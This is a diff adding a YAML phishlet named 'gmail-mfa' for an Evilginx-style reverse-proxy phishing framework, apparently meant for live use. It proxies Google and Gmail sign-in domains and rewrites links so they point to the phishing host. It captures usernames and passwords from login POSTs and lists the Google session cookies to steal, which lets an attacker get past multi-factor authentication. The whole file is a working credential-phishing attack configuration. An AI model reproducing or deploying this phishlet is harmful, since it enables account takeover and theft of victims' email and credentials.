@@ -1,0 +1,42 @@
+name: 'gmail-mfa'
+author: '@H3llKa1ser'
+min_ver: '2.4.0'
+proxy_hosts:
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: true}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false}
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'googleapis.com', session: false, is_landing: false}
+  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false}
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false}
+  - {phish_sub: 'clients1', orig_sub: 'clients1', domain: 'google.com', session: false, is_landing: false}
+  - {phish_sub: 'lh3', orig_sub: 'lh3', domain: 'googleusercontent.com', session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: 'accounts.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+auth_tokens:
+  - domain: '.google.com'
+    keys: ['SID', 'SSID', 'HSID', 'APISID', 'SAPISID', 'NID', 'OSID', '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PAPISID', '__Secure-3PAPISID', '__Secure-1PSIDTS', '__Secure-3PSIDTS', '__Secure-1PSIDCC', '__Secure-3PSIDCC']
+  - domain: 'accounts.google.com'
+    keys: ['GAPS', 'LSID', 'ACCOUNT_CHOOSER']
+  - domain: 'mail.google.com'
+    keys: ['COMPASS', 'GMAIL_AT']
+credentials:
+  username:
+    key: 'identifier'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'Passwd'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'accounts.google.com'
+  path: '/ServiceLogin'
+force_post:
+  - path: '/signin/v2/challenge/password/empty'
+    search:
+      - {key: 'Passwd', search: '.*'}
+    force:
+      - {key: 'Passwd', value: ''}
+    type: 'post'
